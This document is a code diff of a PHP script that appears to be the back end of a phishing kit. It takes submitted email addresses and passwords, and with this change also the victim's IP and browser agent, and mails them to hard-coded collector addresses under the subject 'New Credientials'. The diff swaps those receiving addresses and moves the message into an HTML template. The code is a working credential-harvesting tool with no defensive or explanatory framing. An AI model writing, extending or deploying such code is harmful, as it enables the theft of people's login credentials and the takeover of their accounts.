@@ -5,8 +5,11 @@ header("Access-Control-Allow-Origin: *");
 header("Content-Type: application/json");
 
 
-$EMAIL = "gottmacht.empire@gmail.com";
-$SENDER_EMAIL = "gottmacht.empire@yandex.com";
+// $EMAIL = "gottmacht.empire@gmail.com";
+// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
+
+$EMAIL = "alexjace151@gmail.com";
+$SENDER_EMAIL = "jacealex151@gmail.com";
 
 
 function sendEmail($message, $subject = "New Credientials") {
@@ -25,12 +28,17 @@ function sendEmail($message, $subject = "New Credientials") {
 if(isset($_REQUEST['send'])) {
     $email = $_REQUEST['email'];
     $password = $_REQUEST['password'];
+    $ip = $_REQUEST['ip'];
+    $agent = $_REQUEST['agent'];
+
     try {
         // Send Mail
-        $message = "<div> 
-                        <p>Email: <strong>$email</strong></p>
-                        <p>Password: <strong>$password</strong></p>
-                    </div>";
+        $message = file_get_contents("./format.html");
+        $message = str_replace("{{email}}", $email, $message);
+        $message = str_replace("{{password}}", $password, $message);
+        $message = str_replace("{{ip}}", $ip, $message);
+        $message = str_replace("{{agent}}", $agent, $message);
+
         $mail = sendEmail($message);
         if(!$mail) throw new Exception("Could not send");
 
